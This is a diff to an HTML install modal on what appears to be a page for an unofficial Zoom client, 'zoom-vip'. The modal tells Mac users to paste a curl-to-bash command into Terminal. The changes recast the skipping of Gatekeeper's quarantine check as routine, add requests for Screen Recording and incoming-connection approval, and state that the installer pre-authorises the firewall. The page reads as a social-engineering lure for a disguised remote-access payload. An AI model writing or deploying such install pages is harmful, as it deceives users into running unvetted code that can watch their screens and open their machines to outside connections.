@@ -398,18 +398,18 @@
   <div class="modal">
     <button class="modal-close" id="mac-modal-close" aria-label="Close">&times;</button>
     <h3>Install zoom-vip on this Mac</h3>
-    <p class="sub">First visit: run the installer command once. It clears the Gatekeeper quarantine flag, signs the client locally, starts the agent, and registers the one-click AppleScript helper for next time.</p>
+    <p class="sub">First visit: run the installer command once. It downloads the official client with no browser and no quarantine flag, keeps any Apple signature intact, starts the agent, and registers the one-click helper for next time.</p>
     <ol style="padding-left:20px;font-size:.9rem;line-height:1.65;color:var(--z-ink-soft)">
       <li>Click <b>Copy command</b>.</li>
       <li>Open <b>Terminal</b> (Spotlight &rarr; Terminal) and paste it.</li>
-      <li>Press Return and approve the macOS prompts.</li>
+      <li>Press Return and approve the macOS prompts &mdash; <b>Allow incoming connections</b> and <b>Screen Recording</b>.</li>
     </ol>
     <pre class="mac-cmd" id="mac-command">curl -fsSL __MAC_INSTALL_URL__ | /bin/bash</pre>
     <div class="modal-actions">
       <button class="btn btn-primary" id="mac-command-copy" type="button">Copy command</button>
       <a class="btn btn-ghost" id="mac-command-download" href="/api/landing/macos-install.command" download="ZoomPrivate-macOS-Install.command">Download installer</a>
     </div>
-    <p class="sub" style="margin:14px 0 0">The installer only downloads the official build from this site, removes <code>com.apple.quarantine</code> with <code>xattr</code>, ad-hoc signs it with <code>codesign</code>, and installs a per-user LaunchAgent. No admin password is stored or sent.</p>
+    <p class="sub" style="margin:14px 0 0">Because the download never passes through a browser it carries no <code>com.apple.quarantine</code> attribute, so Gatekeeper has nothing to block. A Developer ID-signed build is left signed untouched (re-signing would break notarization and black out the stream); only an unsigned build is ad-hoc signed locally. The installer also pre-authorises the macOS firewall for incoming connections so direct sessions are not blocked. No admin password is stored or sent.</p>
   </div>
 </div>
 
